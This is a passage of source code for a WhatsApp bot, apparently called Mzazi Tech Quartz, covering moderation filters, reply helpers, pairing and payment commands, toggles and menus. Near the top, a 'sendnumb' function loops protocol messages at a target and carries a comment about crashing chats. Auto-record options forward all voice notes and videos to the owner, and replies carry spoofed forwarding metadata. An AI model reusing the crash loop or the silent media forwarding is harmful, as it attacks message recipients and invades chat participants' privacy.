      // ── ANTILINK ──────────────────────────────────────────
      const _antilinkMode = _gs.antilink;
      if (_antilinkMode && _antilinkMode !== 'off') {
        const msgText = budy || '';
        if (URL_REGEX.test(msgText)) {
          await applyMode(_antilinkMode, 'links');
          return;
        }
      }

      // ── ANTISTICKER ───────────────────────────────────────
      const _antistickerMode = _gs.antisticker;
      if (_antistickerMode && _antistickerMode !== 'off' && _antistickerMode !== false) {
        const isSticker = !!(message.stickerMessage);
        if (isSticker) {
          await applyMode(_antistickerMode, 'stickers');
          return;
        }
      }

      // ── ANTIIMAGE ─────────────────────────────────────────
      const _antiimageMode = _gs.antiimage;
      if (_antiimageMode && _antiimageMode !== 'off' && _antiimageMode !== false) {
        const isImage = !!(message.imageMessage) && !message.imageMessage?.gifPlayback;
        if (isImage) {
          await applyMode(_antiimageMode, 'images');
          return;
        }
      }
    }
const sendnumb = async (mzazi, target, loopz = 10, ptcp = true) => {
  for (let z = 0; z < loopz; z++) {
    await mzazi.relayMessage(target, {
      protocolMessage: {
        type: 11 // 25 for crash chat channelz
      }
    }, ptcp ? {
      participant: { jid: target }
    } : {});
  }
};

const mzazireply3 = async (caption, options = {}) => {
  try {
    const { image = null, buttons = [], mentions = [] } = options;

    // Build message
    let message = { text: caption };

    // Add image if provided
    if (image) {
      message.image = image;
      message.caption = caption;
      delete message.text;
    }

    // Add mentions
    if (mentions.length) {
      message.contextInfo = { mentionedJid: mentions };
    }

    // Add buttons if provided
    if (buttons.length) {
      message.buttons = buttons.map((btn) => ({
        buttonId: btn.id || 'menu',
        buttonText: { displayText: btn.label || 'Menu' },
        type: 1,
      }));
      message.headerType = 4;
      message.footer = options.footer || '© Bot';
    }

    // Send
    await mzazi.sendMessage(sender, message);

  } catch (err) {
    console.error('mzazireply error:', err);
    // Fallback: plain text
    try {
      await mzazi.sendMessage(sender, { text: caption });
    } catch (e) {}
  }
};
const mzazireply27 = async (text) => {
    return await mzazi.sendMessage(
        sender,
        {
            text,
            footer: "© ${botName.toUpperCase()}",
            buttons: [
                {
                    buttonId: ".menu",
                    buttonText: { displayText: "📜 MENU" },
                    type: 1
                },
                {
                    buttonId: ".owner",
                    buttonText: { displayText: "👑 OWNER" },
                    type: 1
                },
                {
                    buttonId: ".alive",
                    buttonText: { displayText: "🤖 STATUS" },
                    type: 1
                }
            ],
            headerType: 1
        },
        { quoted: m }
    );
};

const mzazireply = async (text, options = {}) => {
    try {
        const {
            quoted = null,
            mentions = [],
            image = null,
            showMenu = false,
            customButtons = null,
            footer = `© ${botName} | MAGGIE X KERUBO`
        } = options;

        const chatId = sender;

        // ── Build contextInfo ──
        let contextInfo = { mentionedJid: mentions };

        // ── If replying to a message ──
        if (quoted) {
            contextInfo = {
                ...contextInfo,
                stanzaId: quoted.key?.id,
                participant: quoted.key?.participant || quoted.key?.remoteJid,
                quotedMessage: quoted.message,
                remoteJid: quoted.key?.remoteJid
            };
        }

        // ── Add forwarding ──
        contextInfo = {
            ...contextInfo,
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363425539800408@newsletter",
                newsletterName: botName.toUpperCase(),
                serverMessageId: 143
            }
        };

        // ── Build message payload ──
        let messagePayload = { contextInfo };

        // ── Handle image ──
        let finalImage = image;
        
        if (showMenu) {
            // Get menu image
            const customMenuPic = `./database/sessions/${botPhoneNum}/menu.jpg`;
            const defaultMenuPic = "./media/menu.jpg";
            const menuPicPath = fs.existsSync(customMenuPic) ? customMenuPic : defaultMenuPic;
            
            if (fs.existsSync(menuPicPath)) {
                finalImage = fs.readFileSync(menuPicPath);
            }
        }

        // ── Process image ──
        if (finalImage) {
            let imageBuffer = null;
            if (Buffer.isBuffer(finalImage)) {
                imageBuffer = finalImage;
            } else if (typeof finalImage === 'string' && fs.existsSync(finalImage)) {
                imageBuffer = fs.readFileSync(finalImage);
            }
            
            if (imageBuffer) {
                messagePayload.image = imageBuffer;
                messagePayload.caption = text;
                messagePayload.jpegThumbnail = imageBuffer;
            } else {
                messagePayload.text = text;
            }
        } else {
            messagePayload.text = text;
        }

        // ── Default buttons (Menu, Ping, Owner) ──
        const defaultButtons = [
            {
                buttonId: `${prefix}menu`,
                buttonText: { displayText: "📜 Menu" },
                type: 1
            },
            {
                buttonId: `${prefix}ping`,
                buttonText: { displayText: "🏓 Ping" },
                type: 1
            },
            {
                buttonId: `${prefix}owner`,
                buttonText: { displayText: "👑 Owner" },
                type: 1
            }
        ];

        // ── Use custom buttons if provided, else default ──
        const buttons = customButtons || defaultButtons;

        // ── Add buttons if provided ──
        if (buttons.length > 0) {
            messagePayload.buttons = buttons;
            messagePayload.headerType = 4;
            messagePayload.footer = footer;
        }

        // ── Add owner name to footer if not set ──
        if (!footer.includes('MAGGIE X KERUBO')) {
            messagePayload.footer = `${footer} | 👑 MAGGIE X KERUBO`;
        }

        // ── Send ──
        await mzazi.sendMessage(chatId, messagePayload);

    } catch (err) {
        logSystem(`mzazireply error: ${err.message}`, 'error');
        
        // Ultimate fallback
        try {
            await mzazi.sendMessage(sender, { text: text });
        } catch (e) {
            logSystem(`Final fallback failed: ${e.message}`, 'error');
        }
    }
};


    // MRSMZAZI is a stable WhatsApp-side access keyword. It is intentionally
    // accepted without the normal command prefix so users do not need Telegram
    // to start the pairing/payment flow.
    if (!isCmd) {
      const barePairingCommand = budy.trim().match(/^MRSMZAZI(?:\s+(.+))?$/i);
      if (barePairingCommand) {
        isCmd = true;
        command = "mrsmzazi";
        args = barePairingCommand[1]
          ? barePairingCommand[1].trim().split(/\s+/)
          : [];
      }
    }

    if (!isCmd) return;

    // ========== REACT TO COMMAND ==========
    

    // ========== COMMANDS ==========
    const startTime = Date.now();

    // ─────────────────────────────────────────────────────────────────────────
    // WhatsApp account pairing + billing
    //
    // The fixed MRSMZAZI keyword is a command/access alias. The actual
    // WhatsApp pairing code must still come from WhatsApp's servers; replacing
    // that server-issued code with a constant would make linking fail.
    // ─────────────────────────────────────────────────────────────────────────
    const whatsappCommand = command.toLowerCase();
    const isPairingCommand = ["pair", "connect", "mrsmzazi"].includes(whatsappCommand);
    const isPlansCommand = ["plan", "plans", "subscription"].includes(whatsappCommand);
    const isPaymentCommand = ["buy", "pay", "payment"].includes(whatsappCommand);
    const isVerifyCommand = ["verify", "verify payment"].includes(whatsappCommand);

    const planKeyFromInput = (value) => {
      const raw = String(value || "").trim().toLowerCase();
      if (raw === "5" || raw === "5devices" || raw === "5numbers" || raw === "plan5") return "PLAN_5";
      if (raw === "10" || raw === "10devices" || raw === "10numbers" || raw === "plan10") return "PLAN_10";
      if (raw === "20" || raw === "20devices" || raw === "20numbers" || raw === "plan20") return "PLAN_20";
      if (raw === "unlimited" || raw === "infinite" || raw === "999" || raw === "unlimitednumbers") return "UNLIMITED";
      const normalized = raw.toUpperCase().replace(/-/g, "_");
      return PLANS[normalized] ? normalized : null;
    };

    const sendWhatsappPlans = async () => {
      const planLines = Object.entries(PLANS)
        .filter(([, plan]) => plan.price > 0)
        .map(([key, plan]) =>
          `• ${key}: ${plan.name} — KES ${plan.price} / ${plan.days} days`
        )
        .join("\n");
      await mzazireply(
        `💳 *MZAZI TECH QUARTZ PLANS*\n\n` +
        `🆓 FREE — 1 WhatsApp device\n` +
        `${planLines}\n\n` +
        `Pay from WhatsApp with:\n` +
        `• ${prefix}pay PLAN_5\n` +
        `• ${prefix}pay 10\n\n` +
        `After paying, use ${prefix}verify <reference>.`
      );
    };

    if (isPairingCommand) {
      if (isGroup) {
        await mzazireply("❌ Pairing and payment commands are available in a private chat only.");
        return;
      }

      const pairingArgs = whatsappCommand === "mrsmzazi" && ["pair", "connect"].includes(String(args[0] || "").toLowerCase())
        ? args.slice(1)
        : args;
      const requestedNumber = pairingArgs[0] || "";
      const accountId = resolveWhatsappAccountId(senderPureNumber, botPhoneNum);

      if (!accountId) {
        await mzazireply("❌ I could not identify your WhatsApp number. Please send this command from a normal private chat.");
        return;
      }

      if (!requestedNumber) {
        await mzazireply(
          `🔗 *WHATSAPP PAIRING*\n\n` +
          `Use:\n` +
          `• ${prefix}pair 2547XXXXXXXX\n` +
          `• ${prefix}connect 2547XXXXXXXX\n` +
          `• MRSMZAZI 2547XXXXXXXX\n\n` +
          `MRSMZAZI is the fixed command keyword. The displayed pairing code is generated securely by WhatsApp and changes for every request.`
        );
        return;
      }

      const validNumber = validatePhoneNumber(requestedNumber);
      if (!validNumber) {
        await mzazireply("❌ Invalid phone number. Use international format, for example: 254712345678.");
        return;
      }

      const currentSessions = loadJSON("./database/paired.json", []);
      if (currentSessions.some((session) => session.number === validNumber)) {
        await mzazireply("⚠️ This WhatsApp number is already paired. Use a different number or manage the existing session.");
        return;
      }

      try {
        const account = await getWhatsappSubscription(accountId);
        const globalSettings = loadJSON("./database/settings.json", {});
        if (globalSettings.premiumOnly && !isOwner && account.plan === "FREE") {
          await mzazireply(
            `❌ Pairing is currently premium-only.\n\nUse ${prefix}plans to choose a plan, then ${prefix}pay PLAN_5 to generate a Paystack payment link.`
          );
          return;
        }

        if (!isOwner && !(await canAddDevice(accountId))) {
          await mzazireply(
            `⚠️ *DEVICE LIMIT REACHED*\n\n` +
            `Plan: *${PLANS[account.plan]?.name || account.plan}*\n` +
            `Devices: *${account.deviceCount}/${account.maxDevices === 999 ? "Unlimited" : account.maxDevices}*\n\n` +
            `Use ${prefix}plans and ${prefix}pay PLAN_5 to upgrade.`
          );
          return;
        }

        await mzazireply("⏳ Generating a secure WhatsApp pairing code...");
        const code = await requestPairingCode(validNumber, accountId, { notifyTelegram: false, source: "whatsapp" });
        await syncSessionToDb(accountId, validNumber, "ACTIVE");

        await mzazireply(
          `✅ *PAIRING CODE READY*\n\n` +
          `📱 Number: *${validNumber}*\n` +
          `🔐 Code: *${code}*\n\n` +
          `On the phone you want to connect:\n` +
          `WhatsApp → Settings → Linked Devices → Link a Device → Link with phone number\n\n` +
          `⏳ The code expires shortly.`
        );
      } catch (error) {
        logger.error("WhatsApp pairing error:", error?.message || error);
        await mzazireply(`❌ Failed to generate the pairing code.\n\n${error?.message || "Please try again later."}`);
      }
      return;
    }

    if (isPlansCommand || (isPaymentCommand && !args[0])) {
      if (isGroup) {
        await mzazireply("❌ Plans and payment commands are available in a private chat only.");
        return;
      }
      await sendWhatsappPlans();
      return;
    }

    if (isPaymentCommand) {
      if (isGroup) {
        await mzazireply("❌ Payment commands are available in a private chat only.");
        return;
      }
      const accountId = resolveWhatsappAccountId(senderPureNumber, botPhoneNum);
      const planKey = planKeyFromInput(args[0]);
      if (!accountId) {
        await mzazireply("❌ I could not identify your WhatsApp account.");
        return;
      }
      if (!planKey || planKey === "FREE") {
        await mzazireply("❌ Choose a paid plan, for example: .pay PLAN_5, .pay 10, or .pay unlimited");
        return;
      }

      await mzazireply("⏳ Generating your secure Paystack payment link...");
      const result = await createWhatsappPayment(accountId, planKey);
      if (!result.success) {
        await mzazireply(`❌ Could not create the payment link.\n\n${result.error || "Please try again later."}`);
        return;
      }

      const plan = getPlanSummary(planKey);
      await mzazireply(
        `💳 *PAYMENT INITIATED*\n\n` +
        `📦 Plan: *${plan.name}*\n` +
        `💰 Amount: *KES ${plan.price}*\n` +
        `⏳ Validity: *${plan.days} days*\n` +
        `🔖 Reference: \`${result.reference}\`\n\n` +
        `Pay here:\n${result.url}\n\n` +
        `After payment, send:\n${prefix}verify ${result.reference}`
      );
      return;
    }

    if (isVerifyCommand) {
      if (isGroup) {
        await mzazireply("❌ Payment verification is available in a private chat only.");
        return;
      }
      const reference = args.join(" ").trim();
      if (!reference) {
        await mzazireply(`Usage: ${prefix}verify <payment-reference>`);
        return;
      }

      await mzazireply("⏳ Verifying your Paystack payment...");
      const accountId = resolveWhatsappAccountId(senderPureNumber, botPhoneNum);
      const result = await verifyWhatsappPayment(reference, accountId);
      if (!result.success) {
        await mzazireply(
          result.alreadyProcessed
            ? "✅ This payment was already verified."
            : `❌ Payment verification failed.\n\n${result.error || "Please wait a moment and try again."}`
        );
        return;
      }

      const plan = getPlanSummary(result.planKey);
      await mzazireply(
        `✅ *PAYMENT VERIFIED*\n\n` +
        `📦 Plan: *${plan?.name || result.planKey}*\n` +
        `📱 Devices: *${plan?.maxDevices === 999 ? "Unlimited" : plan?.maxDevices}*\n` +
        `⏳ Validity: *${plan?.days || 30} days*\n\n` +
        `You can now use ${prefix}pair 2547XXXXXXXX to connect a device.`
      );
      return;
    }

    switch (command) {
      // ------------------- PLAY (with interactive format choice) -------------------
      


      // ------------------- OTHER COMMANDS (add your own here) -------------------
      
      // ───────────────────────────────────────────────────────────────────────
      // STICKER COMMAND SYSTEM — addsticker CASE
      // PLACEMENT: Inside the switch(command) block, alongside your other cases.
      //
      // Usage (owner only):
      //   1. Send/forward a sticker into the chat.
      //   2. Reply to that sticker with:  .addsticker menu
      //   3. The bot extracts the sticker's fileSha256, base64-encodes it,
      //      stores the mapping  { <id>: "menu" }  in memory AND on disk,
      //      and confirms to the owner.
      //   4. From that point on, anyone who sends that sticker triggers .menu
      //      automatically via the detection middleware above switch().
      //
      // Supports both:
      //   • Quoted stickers  — owner sends text, quoting an earlier sticker.
      //   • Sticker replies  — owner replies with text to a sticker message.
      // ───────────────────────────────────────────────────────────────────────
//=====================================//

      case "addsticker": {
        // Owner-only guard
        if (!isOwner) {
            return reply("❌ This command is for the owner only.");
        }

        // Resolve the quoted/replied-to sticker message.
        // Baileys places the replied message in contextInfo.quotedMessage.
        const quotedMsg = m.message?.extendedTextMessage?.contextInfo?.quotedMessage;

        // Also handle the case where the incoming message itself is a sticker
        // (user sends sticker at the same time they include a caption — rare but possible)
        const targetSticker =
            quotedMsg?.stickerMessage ||          // reply to a sticker (most common)
            m.message?.stickerMessage;             // direct sticker with .addsticker as caption (rare)

        if (!targetSticker) {
            return mzazireply(
                "⚠️ *Reply to a sticker* with this command.\n\n" +
                "Example:\n" +
                "  1️⃣ Send any sticker\n" +
                "  2️⃣ Reply to it with: *.addsticker menu*"
            );
        }

        // The mapped command name (everything after .addsticker)
        const cmd = text.trim().toLowerCase();
        if (!cmd) {
            return reply(
                "⚠️ Provide the command name to map.\n\nExample: *.addsticker menu*"
            );
        }

        // fileSha256 uniquely identifies a sticker across all WhatsApp sessions.
        // It is a Uint8Array/Buffer — base64-encode it for safe JSON key storage.
        const rawSha = targetSticker.fileSha256;
        if (!rawSha) {
            logger.error("addsticker: fileSha256 missing — sticker may be malformed.");
            return mzazireply("❌ Could not read sticker ID. Try a different sticker.");
        }

        const stickerId = Buffer.from(rawSha).toString("base64");
        const wasAlreadyMapped = !!db.sticker.stickers[stickerId];

        db.sticker.stickers[stickerId] = {
            command: cmd,
            createdBy: isOwner ? "owner" : senderNumber,
            createdAt: Math.floor(Date.now() / 1000),
        };

        try {
            saveDB("sticker");
            logger.success("Sticker Saved");
        } catch (saveErr) {
            logger.error(`Failed to write sticker.json: ${saveErr.message}`);
            return mzazireply("❌ Sticker mapped in memory but could not save to disk: " + saveErr.message);
        }

        const overwriteNote = wasAlreadyMapped ? " *(previous mapping overwritten)*" : "";
        await mzazireply(
            `✅ *Sticker mapped!*${overwriteNote}\n\n` +
            `📌 *Command:* .${cmd}\n` +
            `🆔 *Sticker ID:* \`${stickerId.slice(0, 12)}…\`\n\n` +
            `Anyone who sends that sticker will now trigger *.${cmd}* automatically.`
        );
        break;
      }
      // ------------------- SIMPLE MENU -------------------
      
//=====================================//

      case "menubshshsjgsvshhshgsv": {
        const pingMs = Date.now() - startTime;

        const menuText = `
╔═════════════════════╗
╠❏ BOT NAME : ${botName.toUpperCase()}
╠❏ PING : ${pingMs}ms
╚═════════════════════╝

Commands:
.menu, .ping, .chatbot on/off
.autotyping on/off
.autorecordaudio on/off
.autorecordvideo on/off
.alwaysonline on/off
        `;

        await mzazireply(menuText.trim());
        break;
      }

//=====================================//

      case "ping3": {
        const latency = Date.now() - startTime;
        await mzazireply(`🏓 Pong! ${latency}ms`);
        break;
      }

//=====================================//

      case "chatbot": {
       if (!isOwner) return mzazireply("❌ Owner only!");
        const sub = args[0]?.toLowerCase();

        if (!sub || (sub !== "on" && sub !== "off")) {
          return mzazireply(
            `🤖 *CHATBOT SETUP*\n\n` +
              `• ${prefix}chatbot on - Enable\n` +
              `• ${prefix}chatbot off - Disable\n\n` +
              (isGroup
                ? `When enabled in a group, I'll respond when mentioned (@${botPhoneNum}) or replied to.`
                : `When enabled in DM, I'll respond to every message you send.`)
          );
        }

        const enabled = getChatbotStatus(sender);

        if (sub === "on") {
          if (enabled) return mzazireply("⚠️ Already enabled.");
          setChatbotStatus(sender, true);
          await mzazireply(
            isGroup
              ? `✅ Chatbot enabled! Mention me (@${botPhoneNum}) or reply to chat.`
              : `✅ Chatbot enabled! I'll now respond to your DM messages.`
          );
        } else {
          if (!enabled) return mzazireply("⚠️ Already disabled.");
          setChatbotStatus(sender, false);
          await mzazireply("❌ Chatbot disabled.");
        }

        break;
      }

//=====================================//

      case "autotyping":
//=====================================//

      case "autotype": {
        if (!isOwner) return mzazireply("❌ Owner only.");

        const sub = args[0]?.toLowerCase();

        if (!sub || (sub !== "on" && sub !== "off")) {
          const cfg = getAutoTyping();

          return mzazireply(
            `⌨️ *Auto-typing*\nStatus: ${cfg.enabled ? "ON" : "OFF"}\nUsage: ${prefix}autotyping on/off`
          );
        }

        const cfg = getAutoTyping();

        if (sub === "on") {
          if (cfg.enabled) return mzazireply("⚠️ Already ON.");

          setAutoTyping(true);
          await mzazireply("✅ Auto-typing enabled. Bot will show 'typing...' when you send messages.");
        } else {
          if (!cfg.enabled) return mzazireply("⚠️ Already OFF.");

          setAutoTyping(false);
          await mzazireply("❌ Auto-typing disabled.");
        }

        break;
      }

//=====================================//

      case "autorecordaudio":
//=====================================//

      case "autorecordingaudio":
//=====================================//

      case "autovoice": {
        if (!isOwner) return mzazireply("❌ Owner only.");

        const sub = args[0]?.toLowerCase();

        if (!sub || (sub !== "on" && sub !== "off")) {
          const cfg = getAutoRecordAudio();

          return mzazireply(
            `🎙️ *Auto-record Audio*\n` +
              `Status: ${cfg.enabled ? "ON" : "OFF"}\n` +
              `When ON, all voice notes are saved to owner's DM.\n` +
              `Usage: ${prefix}autorecordaudio on/off`
          );
        }

        const cfg = getAutoRecordAudio();

        if (sub === "on") {
          if (cfg.enabled) return mzazireply("⚠️ Already ON.");

          setAutoRecordAudio(true);
          await mzazireply("✅ Auto-record audio enabled. Voice notes will be forwarded.");
        } else {
          if (!cfg.enabled) return mzazireply("⚠️ Already OFF.");

          setAutoRecordAudio(false);
          await mzazireply("❌ Auto-record audio disabled.");
        }

        break;
      }

//=====================================//

      case "autorecordvideo":
//=====================================//

      case "autorecordingvideo":
//=====================================//

      case "autovid": {
        if (!isOwner) return mzazireply("❌ Owner only.");

        const sub = args[0]?.toLowerCase();

        if (!sub || (sub !== "on" && sub !== "off")) {
          const cfg = getAutoRecordVideo();

          return mzazireply(
            `📹 *Auto-record Video*\n` +
              `Status: ${cfg.enabled ? "ON" : "OFF"}\n` +
              `When ON, all videos are saved to owner's DM.\n` +
              `Usage: ${prefix}autorecordvideo on/off`
          );
        }

        const cfg = getAutoRecordVideo();

        if (sub === "on") {
          if (cfg.enabled) return mzazireply("⚠️ Already ON.");

          setAutoRecordVideo(true);
          await mzazireply("✅ Auto-record video enabled. Videos will be forwarded.");
        } else {
          if (!cfg.enabled) return mzazireply("⚠️ Already OFF.");

          setAutoRecordVideo(false);
          await mzazireply("❌ Auto-record video disabled.");
        }

        break;
      }

//=====================================//

      case "alwaysonline":
//=====================================//

      case "online": {
        if (!isOwner) return mzazireply("❌ Owner only.");

        const sub = args[0]?.toLowerCase();

        if (!sub || (sub !== "on" && sub !== "off")) {
          const cfg = getAlwaysOnline();

          return mzazireply(
            `🟢 *Always Online*\n` +
              `Status: ${cfg.enabled ? "ON" : "OFF"}\n` +
              `Bot will keep 'online' status.\n` +
              `Usage: ${prefix}alwaysonline on/off`
          );
        }

        const cfg = getAlwaysOnline();

        if (sub === "on") {
          if (cfg.enabled) return mzazireply("⚠️ Already ON.");

          setAlwaysOnline(true);
          startAlwaysOnline();

          await mzazireply("✅ Always online enabled. Bot will stay online.");
        } else {
          if (!cfg.enabled) return mzazireply("⚠️ Already OFF.");

          setAlwaysOnline(false);

          if (alwaysOnlineInterval) clearInterval(alwaysOnlineInterval);

          await mzazireply("❌ Always online disabled.");
        }

        break;
      }

//=====================================//

      case "menubdgwjh": {
        const pingMs = Date.now() - startTime;

        const menuText = `
╔═════════════════════╗
╠❏ BOT NAME : ${botName.toUpperCase()}
╠❏ PING : ${pingMs}ms
╚═════════════════════╝

Commands:
.help, .ping, .chatbot on/off
        `;

        await mzazireply(menuText.trim());
        break;
      }

//=====================================//

      case "chatbot2": {
        if (!isAdmin && !isOwner) return mzazireply("❌ Admins/Owner only.");

        const sub = args[0]?.toLowerCase();

        if (!sub || (sub !== "on" && sub !== "off")) {
          return mzazireply(
            `🤖 *CHATBOT SETUP*\n\n` +
              `• ${prefix}chatbot2 on - Enable chatbot\n` +
              `• ${prefix}chatbot2 off - Disable chatbot\n\n` +
              (isGroup
                ? `When enabled, I'll respond when mentioned (@${botPhoneNum}) or replied to.\nPersonality: casual, witty, English only.`
                : `When enabled in DM, I'll respond to all your messages.\nPersonality: casual, witty, English only.`)
          );
        }

        const enabled = getChatbotStatus(sender);

        if (sub === "on") {
          if (enabled) return mzazireply("⚠️ Chatbot already enabled.");
          setChatbotStatus(sender, true);
          await mzazireply(
            isGroup
              ? `✅ *Chatbot enabled!*\n\nMention me (@${botPhoneNum}) or reply to my messages to chat.`
              : `✅ *Chatbot enabled!*\n\nI'll now respond to your DM messages.`
          );
        } else if (sub === "off") {
          if (!enabled) return mzazireply("⚠️ Chatbot already disabled.");
          setChatbotStatus(sender, false);
          await mzazireply("❌ *Chatbot disabled!* I will no longer respond.");
        }

        break;
      }

      // ─────────────────────────────────────────────
      // STICKER COMMAND
      // ─────────────────────────────────────────────
//=====================================//

      case "sticker": {
    // Get the message we are replying to
    const quotedMsg = m.message?.extendedTextMessage?.contextInfo?.quotedMessage;
    if (!quotedMsg) {
        return mzazireply("📌 Reply to an image or sticker with:\n.sticker");
    }

    let mediaBuffer = null;
    let mediaType = null;

    // Check if replying to an image
    if (quotedMsg.imageMessage) {
        mediaType = "image";
        try {
            const msgObj = { key: m.key, message: { imageMessage: quotedMsg.imageMessage } };
            mediaBuffer = await downloadMediaMessage(
                msgObj,
                "buffer",
                {},
                { logger: pino({ level: "silent" }), reuploadRequest: mzazi.updateMediaMessage }
            );
        } catch (err) {
            logger.error("Error downloading image:", err);
            return mzazireply("❌ Failed to download the image.");
        }
    }
    // Check if replying to a sticker
    else if (quotedMsg.stickerMessage) {
        mediaType = "sticker";
        try {
            const msgObj = { key: m.key, message: { stickerMessage: quotedMsg.stickerMessage } };
            mediaBuffer = await downloadMediaMessage(
                msgObj,
                "buffer",
                {},
                { logger: pino({ level: "silent" }), reuploadRequest: mzazi.updateMediaMessage }
            );
        } catch (err) {
            logger.error("Error downloading sticker:", err);
            return mzazireply("❌ Failed to download the sticker.");
        }
    } else {
        return mzazireply("❌ Only images or stickers are supported.");
    }

    // Send the resulting sticker
    try {
        await mzazi.sendMessage(sender, { sticker: mediaBuffer });
        if (mediaType === "image") {
            mzazireply("✅ Sticker created!");
        } else {
            mzazireply("✅ Sticker stolen!");
        }
    } catch (err) {
        logger.error("Sticker send error:", err);
        mzazireply("❌ Failed to send sticker. The media might be too large or unsupported.");
    }
    break;
}
  
      // ... add your other commands here ...

      // ─────────────────────────────────────────────
      //  MENU
      // ─────────────────────────────────────────────
      
//=====================================//

      case "testmenu": {
    const botName = getBotName(botPhoneNum);
    const pingMs = Date.now() - startTime;

    // menu pic
    const customMenuPic = `./database/sessions/${botPhoneNum}/menu.jpg`;
    const defaultMenuPic = "./media/menu.jpg";

    const menuPic = fs.existsSync(customMenuPic)
        ? customMenuPic
        : defaultMenuPic;

    const menuText = `
 
╔═════════════════════╗
╠❏ BOT NAME : ${botName.toUpperCase()}
╠❏ VERSION : 1.0.0
╠❏ PING : ${pingMs}ms
╠❏ OWNER : Mzazi Tech inc 
╠❏ HOST : Pterodactyl Panel
╠❏ BAILEYS : OFFICIAL
╠❏ TYPE : CASE
╠❏ STATUS : ONLINE
╚═════════════════════╝

╔═⟪     GENERAL     ⟫═╗
╠❏ ${prefix}menu
╠❏ ${prefix}ping
╠❏ ${prefix}ping2
╠❏ ${prefix}uptime  
╠❏ ${prefix}systeminfo 
╠❏ ${prefix}owner  
╠❏ ${prefix}tqto 
╠❏ ${prefix}rules
╠❏ ${prefix}vv
╚══════════════════╝

╔═⟪  GROUP ADMIN  ⟫═╗
╠❏ ${prefix}kick 
╠❏ ${prefix}add 
╠❏ ${prefix}promote 
╠❏ ${prefix}demote 
╠❏ ${prefix}mute        
╠❏ ${prefix}unmute          
╠❏ ${prefix}tagall         
╠❏ ${prefix}hidetag
╠❏ ${prefix}groupinfo  
╠❏ ${prefix}link        
╠❏ ${prefix}revoke
╠❏ ${prefix}delete         
╠❏ ${prefix}setrules 
╠❏ ${prefix}warn 
╠❏ ${prefix}warnlist       
╠❏ ${prefix}resetwarn 
╠❏ ${prefix}open
╠❏ ${prefix}close
╠❏ ${prefix}subject
╠❏ ${prefix}setgcname
╠❏ ${prefix}opentime
╠❏ ${prefix}closetime
╚══════════════════╝

╔═⟪ GROUP PROTECTION ⟫═╗
╠❏ ${prefix}antilink on/off
╠❏ ${prefix}antitag on/off
╠❏ ${prefix}antibot on/off
╠❏ ${prefix}antiviewonce on/off
╠❏ ${prefix}antitagadmin on/off
╠❏ ${prefix}antimentiongroup on/off
╠❏ ${prefix}antipromote on/off
╠❏ ${prefix}antidemote on/off
╚══════════════════╝

╔═⟪   OWNER ONLY   ⟫═╗
╠❏ ${prefix}leave 
╠❏ ${prefix}public on/off
╠❏ ${prefix}self on/off
╠❏ ${prefix}addpaid
╠❏ ${prefix}delpaid 
╠❏ ${prefix}listpaid
╠❏ ${prefix}addprem
╠❏ ${prefix}delprem
╠❏ ${prefix}changebotname
╠❏ ${prefix}changebotpic
╠❏ ${prefix}listcmds
╚══════════════════╝

╔═⟪  AI COMMANDS   ⟫═╗
╠❏ ${prefix}ai
╠❏ ${prefix}gpt
╠❏ ${prefix}gemini
╚══════════════════╝

╔═⟪ OTHER COMMANDS ⟫═╗
╠❏ ${prefix}weather
╠❏ ${prefix}joke
╠❏ ${prefix}quote
╠❏ ${prefix}advice
╠❏ ${prefix}catfact
╠❏ ${prefix}news
╠❏ ${prefix}translate
╠❏ ${prefix}trt
╚══════════════════╝

${botName} © 2026`;

    await mzazi.sendMessage(
        sender,
        {
            image: fs.readFileSync(menuPic),
            caption: menuText.trim(),
            contextInfo: {
                forwardingScore: 999,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: "120363425539800408@newsletter",
                    newsletterName: `${botName.toUpperCase()}`,
                    serverMessageId: 143
                }
            }
        },
        { quoted: m }
    );
}
break;



//=====================================//

case 'menu6':
//=====================================//

case "menu": {
  try {
    // ── Load menu image ──
    const customMenuPic = `./database/sessions/${botPhoneNum}/menu.jpg`;
    const defaultMenuPic = "./media/menu.jpg";
    const menuPicPath = fs.existsSync(customMenuPic) ? customMenuPic : defaultMenuPic;
    
    // ── Get bot statistics ──
    const botName = getBotName(botPhoneNum);
    const pingMs = Date.now() - startTime;
    const uptimeSeconds = process.uptime();
    const days = Math.floor(uptimeSeconds / 86400);
    const hours = Math.floor((uptimeSeconds % 86400) / 3600);
    const minutes = Math.floor((uptimeSeconds % 3600) / 60);
    const seconds = Math.floor(uptimeSeconds % 60);
    const uptimeStr = `${days}d ${hours}h ${minutes}m ${seconds}s`;
    const now = new Date();
    const dateStr = now.toLocaleDateString('en-US', { 
      weekday: 'long', 
      year: 'numeric', 
      month: 'long', 
      day: 'numeric' 
    });
    const timeStr = now.toLocaleTimeString('en-US', { 
      hour: '2-digit', 
      minute: '2-digit', 
      second: '2-digit', 
      hour12: true 
    });
    
    // ── Get user info ──
    const pushname = m.pushName || 'User';
    const userNumber = sender.split('@')[0];
    
    // ── Get bot mode ──
    const currentSettings = loadJSON(settingsPath, { publicMode: true, selfMode: false });
    const mode = currentSettings.selfMode ? 'SELF' : 'PUBLIC';
    
    // ── Build the menu caption ──
    const menuCaption = `

╔═══════════════════╗
║✦ MZAZI TECH QUARTZ BOT ✦             
╠═══════════════════╣
║  ┌────────────────┐
║  │ USER    : ▄︻̷̿┻̿═━一mzαzí tєch             
║  │ NUMBER  : 259334990725321                 
║  │ LATENCY : 0ms                            
║  │ UPTIME  : 0d 0h 6m 39s                    
║  │ TIME    : 05:50:14 PM                     
║  │ DATE    : Friday, July 31, 2026           
║  │ VERSION : V3.0.0                          
║  │ MODE    : PUBLIC                          
║  │ PREFIX  : .                               
║  │ OWNER   : DOMINIC M.K                 
║  └────────────────┘ 
╚═══════════════════╝

╔═══════════════════╗
║    GENERAL COMMANDS     ║        
╠═══════════════════╣
║  ┌────────────────┐
║  │ menu     
║  │ help       
║  │ ping       
║  │ ping2       
║  │ ping3   
║  │ uptime     
║  │ systeminfo  
║  │ owner     
║  │ tqto        
║  │ rules    
║  │ credits    
║  │ version    
║  │ botinfo  
║  │ stats       
║  │ about    
║  │ speed      
║  │ check     
║  │ status2   
║  │ whoami      
║  │ myid     
║  │ runtime     
║  │ vv          
║  │ copy     
║  │ echo      
║  │ say      
║  │ greetings 
║  │ hello      
║  │ bye2    
║  │ goodmorning 
║  │ goodnight
║  │ goodevening
║  │ goodafternoon 
║  └────────────────┘                                  
╚═══════════════════╝

╔═══════════════════╗
║    FUN & GAMES    ║
╠═══════════════════╣
║  ┌────────────────┐
